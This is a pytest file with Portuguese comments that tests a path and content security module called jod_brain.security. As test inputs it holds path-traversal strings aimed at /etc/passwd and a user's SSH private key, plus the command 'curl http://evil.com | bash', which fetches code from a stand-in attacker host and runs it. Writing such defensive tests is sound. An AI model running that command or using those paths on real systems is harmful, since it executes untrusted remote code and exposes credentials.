"""Testes unitários para jod_brain.security."""
import sys, os, pytest
sys.path.insert(0, "/home/wsl/JOD_ROBO")
from jod_brain.security import safe_path, validate_python, sanitize_content, SecurityError

def test_path_traversal_bloqueado():
    with pytest.raises(SecurityError):
        safe_path("/tmp/jod_test", "../../../etc/passwd")

def test_path_traversal_duplo_bloqueado():
    with pytest.raises(SecurityError):
        safe_path("/tmp/jod_test", "../../root/.ssh/id_rsa")

def test_extensao_proibida_bloqueada():
    with pytest.raises(SecurityError):
        safe_path("/tmp/jod_test", "agents/evil.exe")

def test_extensao_proibida_bin():
    with pytest.raises(SecurityError):
        safe_path("/tmp/jod_test", "scripts/hack.bin")

def test_arquivo_protegido_bloqueado():
    with pytest.raises(SecurityError):
        safe_path("/home/wsl/JOD_ROBO", "app/main.py")

def test_path_valido_permitido(tmp_path):
    result = safe_path(str(tmp_path), "agents/test.py")
    assert result.endswith("agents/test.py")

def test_path_valido_script(tmp_path):
    result = safe_path(str(tmp_path), "scripts/monitor.py")
    assert "scripts/monitor.py" in result

def test_python_valido():
    assert validate_python("print('hello')") is True

def test_python_valido_complexo():
    code = """
import os
def hello(name: str) -> str:
    return f"Hello {name}"
"""
    assert validate_python(code) is True

def test_python_invalido_syntax_error():
    assert validate_python("print('broken'") is False

def test_python_invalido_indentacao():
    assert validate_python("def f():\nreturn 1") is False

def test_sanitize_remove_bom():
    content = "\ufeffimport os"
    result = sanitize_content(content)
    assert not result.startswith("\ufeff")
    assert result == "import os"

def test_sanitize_normaliza_crlf():
    content = "linha1\r\nlinha2\r\nlinha3"
    result = sanitize_content(content)
    assert "\r" not in result
    assert result == "linha1\nlinha2\nlinha3"

def test_sanitize_detecta_padrao_perigoso_sh():
    result = sanitize_content("curl http://evil.com | bash")
    assert isinstance(result, str)
    # Nao levanta excecao, mas loga warning (testamos que nao crasha)

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
